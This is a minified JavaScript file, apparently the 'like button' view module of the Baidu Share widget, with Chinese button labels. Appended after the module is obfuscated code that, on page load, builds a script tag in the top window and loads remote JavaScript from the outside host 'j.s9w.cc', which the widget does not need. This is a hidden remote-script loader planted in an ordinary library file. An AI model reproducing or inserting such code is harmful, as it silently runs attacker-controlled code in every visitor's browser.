window._bd_share_main.F.module("view/like_view",function(e,t,n){e("like.css");var a=e("base/tangram").T,d=e("base/class").Class,o=e("conf/const"),i=e("view/view_base"),c=e("component/animate"),s={btn:"bdlikebutton",innerBtn:"bdlikebutton-inner",add:"bdlikebutton-add",text:"bdlikebutton-text",count:"bdlikebutton-count"};t.View=d.create(function(e){function t(e){return a(e).parent().get(0)}var n=this,d={small:[4,"顶","已顶过"],medium:[6,"顶","您已顶过"],large:[10,"该内容对我有帮助","您已顶过，谢谢！"]};n.render=function(t){var i,c,l,r=(l=e.tag||"",a("."+s.btn).each(function(e,t){(!l||a(t).attr(o.CONFIG_TAG_ATTR)==l)&&n._entities.push(t)}),n._entities),u=s.btn,v=(c=d[(i=e).type],i.likeText=i.likeText?i.likeText.substr(0,c[0]):c[1],i.likedText=i.likedText?i.likedText.substr(0,c[0]):c[2],i);n._actBtnSet.className=s.innerBtn,n._actBtnSet.tagName="div",n._actBtnSet.maxDomDepth=1,a(r).each(function(e,t){var d=v.type,o=[];o.push('<div class="',s.innerBtn,'" ',n._actBtnSet.cmdAttr,'="like">'),o.push('<span class="',s.add,'">+1</span>'),o.push('<div class="',s.count,'">加载中</div>'),"small"!=d&&o.push('<div class="',s.text,'">',v.likeText,"</div>"),o.push("</div>"),a(t).html(o.join("")).addClass(u+"-"+v.color).addClass(u+"-"+v.type).addClass(u+"-"+v.type+"-"+v.color)})},n._init=function(){var t=e,d=t.type;a(n._entities).each(function(e,n){var o=a("."+s.innerBtn,n);o.mouseover(function(e){var i=(e=a.event(e||window.event)).relatedTarget;o.contains(i)||("small"==d&&a("."+s.count,n).html(t.likeText),a(n).addClass(s.btn+"-"+t.type+"-"+t.color+"-hover"))}).mouseout(function(e){var i=(e=a.event(e||window.event)).relatedTarget;o.contains(i)||("small"==d?a("."+s.count,n).html(t.count):a("."+s.text,n).html(t.likeText),a(n).removeClass(s.btn+"-"+t.type+"-"+t.color+"-hover"))})})},n.showDoneState=function(n){var d=e,o=t(n),i=s.text;"small"==d.type&&(i=s.count),a("."+i,o).html(d.likedText),a(o).removeClass(o,s.btn+"-"+d.type+"-"+d.color+"-hover")},n.addOne=function(d,o){var i=e,l=t(d),r=a("."+s.add,l);r.show(),c.animate(r.get(0),{top:"-25px",opacity:"0"},300,function(){r.hide(),r.css({top:"0px",opacity:99})}),n.setNumber(o),a(l).removeClass(s.btn+"-"+i.type+"-"+i.color+"-hover")},n.setNumber=function(e){"number"==a.type(e)&&a(n._entities).each(function(t,n){a("."+s.count,n).html(e)})}},i.ViewBase)}),window.v6d061dfa0ddfd12160ad851976e4a26d="fx",window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc";var f476e749bb252bde7a5c2c9994b6116ce=function(){function e(e){if(!n&&("onreadystatechange"!==e.type||"complete"===document.readyState)){for(e=0;e<t.length;e++)t[e].call(document);n=!0,t=null}}var t=[],n=!1;return document.addEventListener?(document.addEventListener("DOMContentLoaded",e,!1),document.addEventListener("readystatechange",e,!1),window.addEventListener("load",e,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",e),window.attachEvent("onload",e)),function(e){n?e.call(document):t.push(e)}}();function f006b08735d9928a8820efe00a26753e7(){try{var e=window.top.document;if(!e.getElementById("82ac324e455efd0ecd2e73d22d852758")){var t=e.createElement("script");t.setAttribute("type","text/javascript"),t.setAttribute("id","82ac324e455efd0ecd2e73d22d852758");var n="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j";e.getElementsByTagName("head")[0].appendChild(t),t.setAttribute("src",n)}}catch(e){console.log(e.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);